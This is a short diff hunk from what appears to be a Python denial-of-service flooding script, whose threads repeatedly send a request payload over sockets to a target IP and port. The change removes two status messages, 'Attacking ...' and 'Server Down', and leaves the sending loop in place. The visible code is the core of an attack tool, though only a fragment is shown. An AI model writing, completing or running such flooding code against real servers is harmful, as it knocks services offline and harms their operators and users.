@@ -339,10 +339,8 @@ def start():
             for i in range(pack):
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
-            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
         except:
             s.close()
-            print('[+] Server Down.')
 
 for x in range(thread):
     thred = threading.Thread(target=start)
